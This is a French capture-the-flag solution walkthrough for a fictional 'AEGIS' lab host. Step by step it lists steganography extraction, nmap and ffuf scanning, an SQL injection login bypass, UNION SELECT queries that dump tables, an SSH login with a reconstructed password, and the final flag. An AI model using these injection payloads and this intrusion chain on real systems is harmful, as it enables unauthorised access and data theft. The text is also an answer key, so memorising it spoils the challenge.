```
## Chaîne des indices — parcours complet

ÉTAPE 0   Email DGSI reçu dans Thunderbird
          → Photo jointe → steghide → identifiants t.lalimace / Hermes2017

ÉTAPE 1   nmap -sV 192.168.56.42
          → Ports : 80, 2222, 3306, 8080

ÉTAPE 2   Site AEGIS port 80
          → Profil Thomas → lien vers /intranet/login.php

ÉTAPE 3   Connexion intranet avec t.lalimace / Hermes2017
          → Onglet Tickets  : ticket #4523 supprimé → contacter admin
          → Onglet Documents : accès restreint → saisir code admin

ÉTAPE 4   ffuf -u http://192.168.56.42/intranet/FUZZ
          → Découverte de /intranet/admin/

ÉTAPE 5   SQLi sur /intranet/admin/ — bypass login
          → Identifiant : ' OR '1'='1
          → Accès panneau admin obtenu

ÉTAPE 6   Panneau admin — onglet Tickets
          → Ticket #4523 : message Thomas
            "communications espionnées — voir enregistrement dans mes documents"
          → Ticket #4519 : échange direction/admin
            → code documents : AEGIS-2026-UNLOCK

ÉTAPE 7   Retour dashboard Thomas — onglet Documents
          → Code AEGIS-2026-UNLOCK → documents déverrouillés
          → reunion_confidentielle_20052026.wav → strings
            "preuves dans aegis_db — table surveillance"
          → notes_perso.txt
            "mdp : nomChat + monMatricule
             je sais je sais... — T."
          → nomChat = Mistigri (note "croquettes pour Mistigri" dans onglet Notes)
          → monMatricule = trouvé via SQLi table employees
            

ÉTAPE 8   SQLi — formulaire recherche panneau admin
          → UNION SELECT → tables → surveillance
          → UNION SELECT colonnes surveillance
          → UNION SELECT * FROM surveillance
            capture     : cp-Hermes02.pcap
            chemin      : /srv/captures/
          → UNION SELECT matricule,2,3,4 FROM employees WHERE username='t.lalimace'
            matricule   : EMP-2019-047
            Kronitel Holdings identifié

ÉTAPE 9   SSH — connexion avec mot de passe reconstitué
          → notes_perso.txt : "nomChat + monMatricule"
          → nomChat      = Mistigri (note croquettes onglet Notes)
          → monMatricule = EMP-2019-047 (SQLi → table employees)
          → ssh thomas@192.168.56.42 -p 2222
          → Mot de passe : MistigriEMP-2019-047
          → thomas@aegis:~$ cp /srv/captures/cp-Hermes02.pcap ~/
          → scp -P 2222 thomas@192.168.56.42:~/cp-Hermes02.pcap .

ÉTAPE 10  Wireshark — Follow TCP Stream
          → Clic droit sur un paquet → Follow → TCP Stream
          → Conversation HERMES (rouge) → KH-RELAY-02 (bleu)
          → Rapport mensuel Silent Wire : 847 Go exfiltrés
          → Réponse KH-RELAY-02 : accusé réception + clé validation
          → FLAG{S1L3NT_W1R3_TL_2026}

ÉTAPE F   Soumission sur http://192.168.56.42:8080
```